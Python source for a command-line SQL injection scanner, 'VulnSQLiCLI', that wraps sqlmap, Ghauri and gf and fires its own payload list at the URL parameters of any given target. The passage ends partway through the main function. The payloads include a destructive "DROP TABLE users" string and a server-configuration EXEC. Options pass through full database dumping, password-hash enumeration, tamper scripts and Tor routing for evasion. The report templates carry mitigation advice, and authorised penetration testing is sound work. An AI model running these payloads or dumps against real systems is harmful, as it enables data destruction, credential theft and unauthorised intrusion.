import click
import subprocess
import os
import json
import time
import yaml
from pathlib import Path
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, urlunparse, quote, unquote
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
import hashlib
import base64
import random
import string
from typing import Dict, List, Any, Optional, Union
import tempfile
import shutil
import pickle
import fcntl
from contextlib import contextmanager


@contextmanager
def file_lock(file_path):
    """Context manager for file locking to prevent concurrent access."""
    with open(file_path, "a") as lock_file:
        try:
            fcntl.flock(lock_file.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
            yield
        except IOError:
            raise Exception(
                "Another scan is already running. Use --force-resume to override."
            )
        finally:
            fcntl.flock(lock_file.fileno(), fcntl.LOCK_UN)


def send_notification(webhook_url, message, service="slack"):
    """Send notification to Slack or Discord webhook."""
    try:
        if "discord" in webhook_url.lower() or service == "discord":
            payload = {"content": message}
        else:  # Slack
            payload = {"text": message}

        response = requests.post(webhook_url, json=payload, timeout=3)
        if response.status_code == 200:
            return True
    except Exception:
        pass
    return False


def check_tool_availability():
    """Check if SQL injection tools are available."""
    tools = {}

    # Check SQLMap
    try:
        result = subprocess.run(
            ["sqlmap", "--version"], capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            tools["sqlmap"] = {
                "available": True,
                "version": (
                    result.stdout.strip().split("\n")[0] if result.stdout else "Unknown"
                ),
                "path": shutil.which("sqlmap"),
            }
        else:
            tools["sqlmap"] = {"available": False, "error": "Not found"}
    except Exception as e:
        tools["sqlmap"] = {"available": False, "error": str(e)}

    # Check Ghauri
    try:
        result = subprocess.run(
            ["ghauri", "--version"], capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            tools["ghauri"] = {
                "available": True,
                "version": (
                    result.stdout.strip().split("\n")[0] if result.stdout else "Unknown"
                ),
                "path": shutil.which("ghauri"),
            }
        else:
            tools["ghauri"] = {"available": False, "error": "Not found"}
    except Exception as e:
        tools["ghauri"] = {"available": False, "error": str(e)}

    # Check GF (grep for fun)
    try:
        result = subprocess.run(
            ["gf", "-list"], capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            patterns = result.stdout.strip().split("\n") if result.stdout else []
            tools["gf"] = {
                "available": True,
                "version": "Available",
                "path": shutil.which("gf"),
                "patterns": len(patterns),
                "sql_patterns": [p for p in patterns if "sql" in p.lower()],
            }
        else:
            tools["gf"] = {"available": False, "error": "Not found"}
    except Exception as e:
        tools["gf"] = {"available": False, "error": str(e)}

    return tools


def detect_injection_points(url, timeout=5):
    """Detect potential SQL injection points in URL."""
    parsed_url = urlparse(url)
    injection_points = []

    # Check URL parameters
    if parsed_url.query:
        params = parse_qs(parsed_url.query)
        for param, values in params.items():
            injection_points.append(
                {
                    "type": "GET",
                    "parameter": param,
                    "value": values[0] if values else "",
                    "location": "URL",
                    "url": url,
                }
            )

    # Test for form parameters (POST)
    try:
        response = requests.get(url, timeout=timeout, verify=True)
        if response.status_code == 200:
            # Look for forms
            form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>'
            forms = re.findall(form_pattern, response.text, re.IGNORECASE)

            # Look for input fields
            input_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>'
            inputs = re.findall(input_pattern, response.text, re.IGNORECASE)

            for input_name in inputs:
                injection_points.append(
                    {
                        "type": "POST",
                        "parameter": input_name,
                        "value": "",
                        "location": "FORM",
                        "url": url,
                    }
                )
    except Exception:
        pass

    # Check for common injection patterns in headers
    common_headers = ["User-Agent", "X-Forwarded-For", "X-Real-IP", "Referer", "Cookie"]
    for header in common_headers:
        injection_points.append(
            {
                "type": "HEADER",
                "parameter": header,
                "value": "",
                "location": "HEADER",
                "url": url,
            }
        )

    return injection_points


def test_basic_sql_injection(url, timeout=5):
    """Test basic SQL injection patterns."""
    basic_payloads = [
        "'",
        '"',
        "')",
        "'\"",
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR '1'='1",
        "') OR 1=1--",
        "') OR 1=1#",
        '" OR "1"="1',
        '" OR 1=1--',
        '" OR 1=1#',
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "'; DROP TABLE users; --",
        "'; EXEC sp_configure 'show advanced options', 1--",
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' AND 1=CAST((SELECT @@version) AS int)--",
        "' AND (SELECT SUBSTRING(@@version,1,1))='M'--",
        "' WAITFOR DELAY '0:0:5'--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR SLEEP(5)--",
        "' OR pg_sleep(5)--",
        "' OR BENCHMARK(1000000,MD5(1))--",
    ]

    results = []
    parsed_url = urlparse(url)

    for payload in basic_payloads:
        try:
            # Test in URL parameters
            if parsed_url.query:
                params = parse_qs(parsed_url.query)
                for param in params:
                    test_params = params.copy()
                    test_params[param] = [payload]

                    new_query = "&".join(
                        [f"{k}={v[0]}" for k, v in test_params.items()]
                    )
                    test_url = urlunparse(
                        (
                            parsed_url.scheme,
                            parsed_url.netloc,
                            parsed_url.path,
                            parsed_url.params,
                            new_query,
                            parsed_url.fragment,
                        )
                    )

                    start_time = time.time()
                    response = requests.get(test_url, timeout=timeout, verify=True)
                    response_time = time.time() - start_time

                    # Check for SQL error patterns
                    error_patterns = [
                        r"mysql_fetch_array\(\)",
                        r"ORA-\d{5}",
                        r"Microsoft.*ODBC.*SQL Server",
                        r"PostgreSQL.*ERROR",
                        r"SQLite.*error",
                        r"SQL syntax.*MySQL",
                        r"Warning.*mysql_",
                        r"valid MySQL result",
                        r"MySqlClient\.",
                        r"SQLServer JDBC Driver",
                        r"SqlException",
                        r"Oracle error",
                        r"Oracle.*Driver",
                        r"OracleException",
                        r"Microsoft JET Database",
                        r"Access Database Engine",
                        r"Microsoft Access Driver",
                        r"SQL Server.*Native Client",
                        r"SQL Server.*JDBC",
                        r"SQL Server.*Error",
                        r"Microsoft SQL Native Client",
                        r"Incorrect syntax near",
                        r"Unclosed quotation mark",
                        r"quoted string not properly terminated",
                        r"unterminated string literal",
                        r"Error converting data type",
                        r"syntax error at or near",
                        r"column.*does not exist",
                        r"table.*doesn't exist",
                        r"Unknown column",
                        r"ambiguous column name",
                        r"Invalid column name",
                        r"must declare the scalar variable",
                        r"Invalid object name",
                        r"supplied argument is not a valid",
                        r"Column count doesn't match",
                        r"The used SELECT statements have a different number of columns",
                        r"Division by zero",
                        r"Data type mismatch",
                    ]

                    potential_sqli = False
                    error_found = None

                    for pattern in error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            potential_sqli = True
                            error_found = pattern
                            break

                    # Check for time-based injection
                    time_based = response_time > 4.5 and "SLEEP" in payload.upper()

                    if potential_sqli or time_based:
                        results.append(
                            {
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "method": "GET",
                                "vulnerable": True,
                                "type": "time-based" if time_based else "error-based",
                                "error_pattern": error_found,
                                "response_time": response_time,
                                "status_code": response.status_code,
                                "content_length": len(response.content),
                            }
                        )

        except Exception as e:
            continue

    return results


def run_sqlmap(url, options=None, timeout=300):
    """Run SQLMap with specified options."""
    if options is None:
        options = {}

    output_dir = options.get("output_dir", "output/vulnsqlicli")
    Path(output_dir).mkdir(parents=True, exist_ok=True)

    # Build SQLMap command
    cmd = ["sqlmap", "-u", url]

    # Add common options
    if options.get("batch", True):
        cmd.append("--batch")

    if options.get("level", 1) > 1:
        cmd.extend(["--level", str(options["level"])])

    if options.get("risk", 1) > 1:
        cmd.extend(["--risk", str(options["risk"])])

    if options.get("threads", 1) > 1:
        cmd.extend(["--threads", str(options["threads"])])

    if options.get("technique"):
        cmd.extend(["--technique", options["technique"]])

    if options.get("dbms"):
        cmd.extend(["--dbms", options["dbms"]])

    if options.get("cookie"):
        cmd.extend(["--cookie", options["cookie"]])

    if options.get("headers"):
        for header in options["headers"]:
            cmd.extend(["--header", header])

    if options.get("data"):
        cmd.extend(["--data", options["data"]])

    if options.get("proxy"):
        cmd.extend(["--proxy", options["proxy"]])

    if options.get("user_agent"):
        cmd.extend(["--user-agent", options["user_agent"]])

    if options.get("random_agent"):
        cmd.append("--random-agent")

    if options.get("tor"):
        cmd.append("--tor")

    if options.get("check_tor"):
        cmd.append("--check-tor")

    # Output options
    output_file = os.path.join(
        output_dir, f"sqlmap_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    )
    cmd.extend(["--output-dir", output_dir])

    # Tamper scripts
    if options.get("tamper"):
        cmd.extend(["--tamper", options["tamper"]])

    # Advanced options
    if options.get("dbs"):
        cmd.append("--dbs")

    if options.get("tables"):
        cmd.append("--tables")

    if options.get("columns"):
        cmd.append("--columns")

    if options.get("dump"):
        cmd.append("--dump")

    if options.get("dump_all"):
        cmd.append("--dump-all")

    if options.get("passwords"):
        cmd.append("--passwords")

    if options.get("privileges"):
        cmd.append("--privileges")

    if options.get("current_user"):
        cmd.append("--current-user")

    if options.get("current_db"):
        cmd.append("--current-db")

    if options.get("hostname"):
        cmd.append("--hostname")

    if options.get("schema"):
        cmd.append("--schema")

    if options.get("search"):
        cmd.extend(["--search", options["search"]])

    try:
        # Run SQLMap
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout, cwd=output_dir
        )

        return {
            "success": True,
            "command": " ".join(cmd),
            "stdout": result.stdout,
            "stderr": result.stderr,
            "return_code": result.returncode,
            "output_file": output_file,
            "output_dir": output_dir,
        }
    except subprocess.TimeoutExpired:
        return {
            "success": False,
            "command": " ".join(cmd),
            "error": "Timeout expired",
            "timeout": timeout,
        }
    except Exception as e:
        return {
            "success": False,
            "command": " ".join(cmd),
            "error": str(e),
        }


def run_ghauri(url, options=None, timeout=300):
    """Run Ghauri with specified options."""
    if options is None:
        options = {}

    output_dir = options.get("output_dir", "output/vulnsqlicli")
    Path(output_dir).mkdir(parents=True, exist_ok=True)

    # Build Ghauri command
    cmd = ["ghauri", "-u", url]

    # Add common options
    if options.get("batch", True):
        cmd.append("--batch")

    if options.get("level", 1) > 1:
        cmd.extend(["--level", str(options["level"])])

    if options.get("risk", 1) > 1:
        cmd.extend(["--risk", str(options["risk"])])

    if options.get("threads", 1) > 1:
        cmd.extend(["--threads", str(options["threads"])])

    if options.get("technique"):
        cmd.extend(["--technique", options["technique"]])

    if options.get("dbms"):
        cmd.extend(["--dbms", options["dbms"]])

    if options.get("cookie"):
        cmd.extend(["--cookie", options["cookie"]])

    if options.get("headers"):
        for header in options["headers"]:
            cmd.extend(["--header", header])

    if options.get("data"):
        cmd.extend(["--data", options["data"]])

    if options.get("proxy"):
        cmd.extend(["--proxy", options["proxy"]])

    if options.get("user_agent"):
        cmd.extend(["--user-agent", options["user_agent"]])

    if options.get("random_agent"):
        cmd.append("--random-agent")

    # Output options
    output_file = os.path.join(
        output_dir, f"ghauri_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    )

    # Tamper scripts
    if options.get("tamper"):
        cmd.extend(["--tamper", options["tamper"]])

    # Advanced options
    if options.get("dbs"):
        cmd.append("--dbs")

    if options.get("tables"):
        cmd.append("--tables")

    if options.get("columns"):
        cmd.append("--columns")

    if options.get("dump"):
        cmd.append("--dump")

    if options.get("current_user"):
        cmd.append("--current-user")

    if options.get("current_db"):
        cmd.append("--current-db")

    if options.get("hostname"):
        cmd.append("--hostname")

    try:
        # Run Ghauri
        with open(output_file, "w") as f:
            result = subprocess.run(
                cmd,
                stdout=f,
                stderr=subprocess.PIPE,
                text=True,
                timeout=timeout,
                cwd=output_dir,
            )

        # Read output
        with open(output_file, "r") as f:
            stdout_content = f.read()

        return {
            "success": True,
            "command": " ".join(cmd),
            "stdout": stdout_content,
            "stderr": result.stderr,
            "return_code": result.returncode,
            "output_file": output_file,
            "output_dir": output_dir,
        }
    except subprocess.TimeoutExpired:
        return {
            "success": False,
            "command": " ".join(cmd),
            "error": "Timeout expired",
            "timeout": timeout,
        }
    except Exception as e:
        return {
            "success": False,
            "command": " ".join(cmd),
            "error": str(e),
        }


def run_gf_sqli_patterns(urls, output_dir, timeout=30):
    """Run GF with SQL injection patterns."""
    if not isinstance(urls, list):
        urls = [urls]

    Path(output_dir).mkdir(parents=True, exist_ok=True)

    # SQL injection related patterns
    sqli_patterns = [
        "sqli",
        "sqli-error",
        "php-sinks",
        "allparam",
        "urlparams",
        "endpoints",
    ]

    results = {}

    for pattern in sqli_patterns:
        try:
            # Create temporary file with URLs
            with tempfile.NamedTemporaryFile(
                mode="w", suffix=".txt", delete=False
            ) as f:
                for url in urls:
                    f.write(url + "\n")
                temp_file = f.name

            # Run GF with pattern
            output_file = os.path.join(
                output_dir,
                f"gf_{pattern}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
            )

            cmd = ["gf", pattern]

            with open(temp_file, "r") as input_file, open(output_file, "w") as output_f:
                result = subprocess.run(
                    cmd,
                    stdin=input_file,
                    stdout=output_f,
                    stderr=subprocess.PIPE,
                    text=True,
                    timeout=timeout,
                )

            # Read results
            with open(output_file, "r") as f:
                matches = f.read().strip()

            # Clean up temp file
            os.unlink(temp_file)

            results[pattern] = {
                "success": True,
                "command": " ".join(cmd),
                "output_file": output_file,
                "matches": matches.split("\n") if matches else [],
                "match_count": len(matches.split("\n")) if matches else 0,
                "return_code": result.returncode,
                "stderr": result.stderr,
            }

        except subprocess.TimeoutExpired:
            results[pattern] = {
                "success": False,
                "command": " ".join(cmd),
                "error": "Timeout expired",
                "timeout": timeout,
            }
        except Exception as e:
            results[pattern] = {
                "success": False,
                "command": " ".join(cmd) if "cmd" in locals() else "gf " + pattern,
                "error": str(e),
            }

    return results


def analyze_gf_results(gf_results):
    """Analyze GF results for SQL injection indicators."""
    findings = []

    for pattern, result in gf_results.items():
        if result.get("success") and result.get("matches"):
            for match in result["matches"]:
                if match.strip():
                    # Parse URL and identify parameters
                    try:
                        parsed = urlparse(match.strip())
                        if parsed.query:
                            params = parse_qs(parsed.query)
                            for param in params:
                                findings.append(
                                    {
                                        "url": match.strip(),
                                        "parameter": param,
                                        "pattern": pattern,
                                        "tool": "GF",
                                        "severity": "MEDIUM",
                                        "description": f"URL matched GF pattern '{pattern}' - potential SQL injection point",
                                        "location": "URL_PARAMETER",
                                    }
                                )
                    except Exception:
                        # If URL parsing fails, still record the match
                        findings.append(
                            {
                                "url": match.strip(),
                                "parameter": "unknown",
                                "pattern": pattern,
                                "tool": "GF",
                                "severity": "LOW",
                                "description": f"URL matched GF pattern '{pattern}'",
                                "location": "UNKNOWN",
                            }
                        )

    return findings


def parse_sqlmap_output(output_file):
    """Parse SQLMap output for findings."""
    findings = []

    try:
        with open(output_file, "r") as f:
            content = f.read()

        # Parse for vulnerabilities
        vuln_patterns = [
            r"Parameter: (.+?) \((.+?)\)",
            r"Type: (.+)",
            r"Title: (.+)",
            r"Payload: (.+)",
            r"back-end DBMS: (.+)",
            r"current user: (.+)",
            r"current database: (.+)",
            r"hostname: (.+)",
            r"available databases \[(\d+)\]:",
            r"Database: (.+)",
            r"Table: (.+)",
        ]

        for pattern in vuln_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
            if matches:
                findings.extend(matches)

        # Check for successful injection
        if "sqlmap identified the following injection point(s)" in content:
            findings.append("SQL injection vulnerability confirmed")

        if "back-end DBMS:" in content:
            findings.append("Database management system identified")

        if "current user:" in content:
            findings.append("Current user extracted")

        if "current database:" in content:
            findings.append("Current database extracted")

        if "available databases" in content:
            findings.append("Database enumeration successful")

        if "Table:" in content:
            findings.append("Table enumeration successful")

    except Exception as e:
        findings.append(f"Error parsing output: {str(e)}")

    return findings


def parse_ghauri_output(output_file):
    """Parse Ghauri output for findings."""
    findings = []

    try:
        with open(output_file, "r") as f:
            content = f.read()

        # Parse for vulnerabilities
        vuln_patterns = [
            r"Parameter: (.+?) is vulnerable",
            r"Type: (.+)",
            r"Payload: (.+)",
            r"back-end DBMS: (.+)",
            r"current user: (.+)",
            r"current database: (.+)",
            r"hostname: (.+)",
            r"available databases: (.+)",
            r"Database: (.+)",
            r"Table: (.+)",
        ]

        for pattern in vuln_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
            if matches:
                findings.extend(matches)

        # Check for successful injection
        if "is vulnerable" in content:
            findings.append("SQL injection vulnerability confirmed")

        if "back-end DBMS:" in content:
            findings.append("Database management system identified")

        if "current user:" in content:
            findings.append("Current user extracted")

        if "current database:" in content:
            findings.append("Current database extracted")

        if "available databases:" in content:
            findings.append("Database enumeration successful")

        if "Table:" in content:
            findings.append("Table enumeration successful")

    except Exception as e:
        findings.append(f"Error parsing output: {str(e)}")

    return findings


def generate_comprehensive_report(results, output_dir):
    """Generate comprehensive vulnerability report."""
    report = {
        "summary": {
            "total_targets": len(results),
            "vulnerable_targets": 0,
            "critical_vulnerabilities": [],
            "high_vulnerabilities": [],
            "medium_vulnerabilities": [],
            "low_vulnerabilities": [],
            "tools_used": [],
            "scan_timestamp": datetime.now().isoformat(),
        },
        "detailed_results": results,
        "recommendations": [],
        "mitigation_strategies": [],
    }

    # Analyze results
    for result in results:
        target = result.get("target", "Unknown")

        # Check for vulnerabilities
        if result.get("sqlmap_results", {}).get("success"):
            findings = result.get("sqlmap_findings", [])
            if any("vulnerability confirmed" in str(f).lower() for f in findings):
                report["summary"]["vulnerable_targets"] += 1
                report["summary"]["critical_vulnerabilities"].append(
                    {
                        "target": target,
                        "vulnerability": "SQL Injection",
                        "tool": "SQLMap",
                        "severity": "CRITICAL",
                        "description": "SQL injection vulnerability confirmed by SQLMap",
                    }
                )

        if result.get("ghauri_results", {}).get("success"):
            findings = result.get("ghauri_findings", [])
            if any("vulnerability confirmed" in str(f).lower() for f in findings):
                report["summary"]["vulnerable_targets"] += 1
                report["summary"]["critical_vulnerabilities"].append(
                    {
                        "target": target,
                        "vulnerability": "SQL Injection",
                        "tool": "Ghauri",
                        "severity": "CRITICAL",
                        "description": "SQL injection vulnerability confirmed by Ghauri",
                    }
                )

        if result.get("basic_sqli_results"):
            for vuln in result["basic_sqli_results"]:
                if vuln.get("vulnerable"):
                    report["summary"]["vulnerable_targets"] += 1
                    report["summary"]["high_vulnerabilities"].append(
                        {
                            "target": target,
                            "vulnerability": "SQL Injection",
                            "tool": "Basic Testing",
                            "severity": "HIGH",
                            "description": f"Potential SQL injection in parameter: {vuln.get('parameter')}",
                            "payload": vuln.get("payload"),
                        }
                    )

        # Track tools used
        if result.get("sqlmap_results"):
            report["summary"]["tools_used"].append("SQLMap")
        if result.get("ghauri_results"):
            report["summary"]["tools_used"].append("Ghauri")
        if result.get("gf_results"):
            report["summary"]["tools_used"].append("GF")
        if result.get("basic_sqli_results"):
            report["summary"]["tools_used"].append("Basic Testing")

    # Remove duplicates
    report["summary"]["tools_used"] = list(set(report["summary"]["tools_used"]))

    # Generate recommendations
    if report["summary"]["critical_vulnerabilities"]:
        report["recommendations"].extend(
            [
                "🚨 CRITICAL: Immediately patch all SQL injection vulnerabilities",
                "🔒 Implement parameterized queries/prepared statements",
                "🛡️ Use stored procedures with proper input validation",
                "🧼 Sanitize and validate all user inputs",
                "⚡ Implement proper error handling to prevent information disclosure",
            ]
        )

    if report["summary"]["high_vulnerabilities"]:
        report["recommendations"].extend(
            [
                "⚠️ HIGH: Review and fix potential SQL injection points",
                "🔍 Conduct thorough code review for injection vulnerabilities",
                "🎯 Implement input validation and output encoding",
            ]
        )

    # General recommendations
    report["recommendations"].extend(
        [
            "🔐 Use principle of least privilege for database accounts",
            "📊 Implement database activity monitoring",
            "🔄 Regular security testing and vulnerability assessments",
            "🛠️ Keep database systems and applications updated",
            "🏗️ Implement Web Application Firewall (WAF)",
        ]
    )

    # Mitigation strategies
    report["mitigation_strategies"] = [
        {
            "strategy": "Input Validation",
            "description": "Implement strict input validation for all user inputs",
            "implementation": "Use whitelist validation, length limits, and data type checks",
            "priority": "HIGH",
        },
        {
            "strategy": "Parameterized Queries",
            "description": "Use parameterized queries or prepared statements",
            "implementation": "Replace dynamic SQL with parameterized queries in all database interactions",
            "priority": "CRITICAL",
        },
        {
            "strategy": "Stored Procedures",
            "description": "Use stored procedures with proper input validation",
            "implementation": "Implement stored procedures for database operations with input validation",
            "priority": "HIGH",
        },
        {
            "strategy": "Error Handling",
            "description": "Implement proper error handling to prevent information disclosure",
            "implementation": "Use generic error messages and log detailed errors securely",
            "priority": "MEDIUM",
        },
        {
            "strategy": "Database Security",
            "description": "Implement database security best practices",
            "implementation": "Use least privilege accounts, disable unnecessary features, enable logging",
            "priority": "HIGH",
        },
    ]

    return report


def save_results(results, output_dir, format_type="json"):
    """Save scan results to files."""
    output_path = Path(output_dir)
    output_path.mkdir(parents=True, exist_ok=True)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    if format_type == "json":
        output_file = output_path / f"vulnsqlicli_results_{timestamp}.json"
        with open(output_file, "w") as f:
            json.dump(results, f, indent=2, default=str)
        return output_file

    elif format_type == "yaml":
        output_file = output_path / f"vulnsqlicli_results_{timestamp}.yaml"
        with open(output_file, "w") as f:
            yaml.dump(results, f, default_flow_style=False, allow_unicode=True)
        return output_file

    elif format_type == "markdown":
        output_file = output_path / f"vulnsqlicli_report_{timestamp}.md"
        with open(output_file, "w") as f:
            f.write("# SQL Injection Vulnerability Assessment Report\n\n")
            f.write(
                f"**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            )

            if "summary" in results:
                f.write("## Executive Summary\n\n")
                f.write(f"- **Total Targets:** {results['summary']['total_targets']}\n")
                f.write(
                    f"- **Vulnerable Targets:** {results['summary']['vulnerable_targets']}\n"
                )
                f.write(
                    f"- **Critical Vulnerabilities:** {len(results['summary']['critical_vulnerabilities'])}\n"
                )
                f.write(
                    f"- **High Risk Vulnerabilities:** {len(results['summary']['high_vulnerabilities'])}\n"
                )
                f.write(
                    f"- **Medium Risk Vulnerabilities:** {len(results['summary']['medium_vulnerabilities'])}\n"
                )
                f.write(
                    f"- **Tools Used:** {', '.join(results['summary']['tools_used'])}\n\n"
                )

                if results["summary"]["critical_vulnerabilities"]:
                    f.write("## 🚨 Critical Vulnerabilities\n\n")
                    for vuln in results["summary"]["critical_vulnerabilities"]:
                        f.write(f"### {vuln['vulnerability']} - {vuln['target']}\n")
                        f.write(f"- **Tool:** {vuln['tool']}\n")
                        f.write(f"- **Severity:** {vuln['severity']}\n")
                        f.write(f"- **Description:** {vuln['description']}\n\n")

                if results["summary"]["high_vulnerabilities"]:
                    f.write("## ⚠️ High Risk Vulnerabilities\n\n")
                    for vuln in results["summary"]["high_vulnerabilities"]:
                        f.write(f"### {vuln['vulnerability']} - {vuln['target']}\n")
                        f.write(f"- **Tool:** {vuln['tool']}\n")
                        f.write(f"- **Severity:** {vuln['severity']}\n")
                        f.write(f"- **Description:** {vuln['description']}\n")
                        if vuln.get("payload"):
                            f.write(f"- **Payload:** `{vuln['payload']}`\n")
                        f.write("\n")

                if results.get("recommendations"):
                    f.write("## 📋 Recommendations\n\n")
                    for rec in results["recommendations"]:
                        f.write(f"- {rec}\n")
                    f.write("\n")

                if results.get("mitigation_strategies"):
                    f.write("## 🛡️ Mitigation Strategies\n\n")
                    for strategy in results["mitigation_strategies"]:
                        f.write(
                            f"### {strategy['strategy']} ({strategy['priority']} Priority)\n"
                        )
                        f.write(f"**Description:** {strategy['description']}\n\n")
                        f.write(f"**Implementation:** {strategy['implementation']}\n\n")

        return output_file


@click.command()
@click.option("--url", help="Target URL to test for SQL injection")
@click.option(
    "--urls-file",
    type=click.Path(exists=True),
    help="File containing URLs (one per line)",
)
@click.option(
    "--tool",
    type=click.Choice(["sqlmap", "ghauri", "gf", "all", "basic"]),
    default="all",
    help="SQL injection tool to use",
)
@click.option("--sqlmap", is_flag=True, help="Use SQLMap for testing")
@click.option("--ghauri", is_flag=True, help="Use Ghauri for testing")
@click.option("--gf", is_flag=True, help="Use GF (grep for fun) for pattern matching")
@click.option("--basic-test", is_flag=True, help="Perform basic SQL injection tests")
@click.option("--level", default=1, type=int, help="Testing level (1-5)")
@click.option("--risk", default=1, type=int, help="Risk level (1-3)")
@click.option("--technique", help="SQL injection technique (B,E,U,S,T,Q)")
@click.option("--dbms", help="Force DBMS (mysql,mssql,oracle,postgresql,sqlite)")
@click.option("--cookie", help="HTTP Cookie header value")
@click.option("--data", help="Data string to be sent through POST")
@click.option("--proxy", help="HTTP proxy URL (e.g., http://127.0.0.1:8080)")
@click.option("--user-agent", help="HTTP User-Agent header value")
@click.option("--random-agent", is_flag=True, help="Use random User-Agent")
@click.option("--headers", multiple=True, help="Extra HTTP headers")
@click.option("--tamper", help="Tamper script(s) to use")
@click.option("--timeout", default=300, type=int, help="Tool timeout in seconds")
@click.option("--threads", default=1, type=int, help="Number of threads")
@click.option("--batch", is_flag=True, default=True, help="Non-interactive mode")
@click.option("--tor", is_flag=True, help="Use Tor anonymity network")
@click.option("--check-tor", is_flag=True, help="Check if Tor is working")
@click.option("--dbs", is_flag=True, help="Enumerate DBMS databases")
@click.option("--tables", is_flag=True, help="Enumerate DBMS tables")
@click.option("--columns", is_flag=True, help="Enumerate DBMS columns")
@click.option("--dump", is_flag=True, help="Dump DBMS database table entries")
@click.option("--dump-all", is_flag=True, help="Dump all DBMS databases")
@click.option("--passwords", is_flag=True, help="Enumerate DBMS users password hashes")
@click.option("--privileges", is_flag=True, help="Enumerate DBMS users privileges")
@click.option("--current-user", is_flag=True, help="Retrieve DBMS current user")
@click.option("--current-db", is_flag=True, help="Retrieve DBMS current database")
@click.option("--hostname", is_flag=True, help="Retrieve DBMS server hostname")
@click.option("--schema", is_flag=True, help="Enumerate DBMS schema")
@click.option("--search", help="Search for databases, tables, and columns")
@click.option("--output-dir", default="output/vulnsqlicli", help="Output directory")
@click.option("--json-report", is_flag=True, help="Generate JSON report")
@click.option("--yaml-report", is_flag=True, help="Generate YAML report")
@click.option("--markdown-report", is_flag=True, help="Generate Markdown report")
@click.option("--slack-webhook", help="Slack webhook URL for notifications")
@click.option("--discord-webhook", help="Discord webhook URL for notifications")
@click.option("--verbose", "-v", is_flag=True, help="Enable verbose output")
@click.option("--check-tools", is_flag=True, help="Check tool availability and exit")
@click.option(
    "--resume", is_flag=True, help="Resume interrupted scan from previous state"
)
@click.option(
    "--force-resume",
    is_flag=True,
    help="Force resume even if scan appears to be running",
)
@click.option("--show-resume", is_flag=True, help="Show previous scan resume status")
@click.option("--clear-resume", is_flag=True, help="Clear previous scan state")
def main(
    url,
    urls_file,
    tool,
    sqlmap,
    ghauri,
    gf,
    basic_test,
    level,
    risk,
    technique,
    dbms,
    cookie,
    data,
    proxy,
    user_agent,
    random_agent,
    headers,
    tamper,
    timeout,
    threads,
    batch,
    tor,
    check_tor,
    dbs,
    tables,
    columns,
    dump,
    dump_all,
    passwords,
    privileges,
    current_user,
    current_db,
    hostname,
    schema,
    search,
    output_dir,
    json_report,
    yaml_report,
    markdown_report,
    slack_webhook,
    discord_webhook,
    verbose,
    check_tools,
    force_resume,
    resume,
    show_resume,
    clear_resume,
):
    """
    🔍 Advanced SQL Injection Vulnerability Scanner

    Comprehensive SQL injection testing using multiple tools:
    • SQLMap - Advanced SQL injection detection and exploitation
    • Ghauri - Fast SQL injection detection and exploitation
    • GF (grep for fun) - Pattern matching for SQL injection indicators
    • Basic Testing - Manual payload testing

    Security Testing Features:
    --sqlmap                     # Use SQLMap for comprehensive testing
    --ghauri                     # Use Ghauri for fast detection
    --gf                         # Use GF for pattern matching
    --basic-test                 # Perform basic manual testing
    --tool all                   # Use all available tools

    Advanced Options:
    --level 3                    # Testing level (1-5)
    --risk 2                     # Risk level (1-3)
    --technique BEUST            # SQL injection techniques
    --dbms mysql                 # Force specific DBMS
    --tamper space2comment       # Use tamper scripts
    --proxy http://127.0.0.1:8080 # HTTP proxy
    --tor                        # Use Tor network

    Database Enumeration:
    --dbs                        # Enumerate databases
    --tables                     # Enumerate tables
    --columns                    # Enumerate columns
    --dump                       # Dump table data
    --current-user               # Get current user
    --current-db                 # Get current database
    --passwords                  # Enumerate password hashes
    --privileges                 # Enumerate user privileges

    Resume & State Management:
    --resume                     # Resume interrupted scan from previous state
    --show-resume                # Show previous scan resume status
    --clear-resume               # Clear previous scan state
    --force-resume               # Force resume even if scan appears running

    Examples:
    # Basic SQL injection testing
    vulnsqlicli --url "http://example.com/page.php?id=1" --basic-test

    # Comprehensive testing with SQLMap
    vulnsqlicli --url "http://example.com/page.php?id=1" --sqlmap --level 3 --risk 2

    # Fast detection with Ghauri
    vulnsqlicli --url "http://example.com/page.php?id=1" --ghauri --batch

    # Pattern matching with GF
    vulnsqlicli --url "http://example.com/page.php?id=1" --gf

    # Full enumeration after finding vulnerability
    vulnsqlicli --url "http://example.com/page.php?id=1" --sqlmap --dbs --tables --columns --current-user

    # Test multiple URLs from file
    vulnsqlicli --urls-file urls.txt --tool all --json-report --markdown-report

    # Advanced testing with proxy and tamper
    vulnsqlicli --url "http://example.com/page.php?id=1" --sqlmap --proxy http://127.0.0.1:8080 --tamper space2comment,charencode --level 5 --risk 3

    # Steganographic testing with Tor
    vulnsqlicli --url "http://example.com/page.php?id=1" --sqlmap --tor --check-tor --random-agent --level 3

    # Resume interrupted scan
    vulnsqlicli --resume --verbose

    # Show previous scan status
    vulnsqlicli --show-resume

    # Clear previous scan state
    vulnsqlicli --clear-resume

    # Resume with force (if scan appears to be running)
    vulnsqlicli --resume --force-resume
    """

    if verbose:
        print("🚀 [START] VulnSQLiCLI - Advanced SQL Injection Scanner")
        print(f"🎯 [TARGET] {url}")

    # Check tool availability
    if check_tools:
        print("🔧 [TOOLS] Checking tool availability...")
        tools = check_tool_availability()
        for tool_name, info in tools.items():
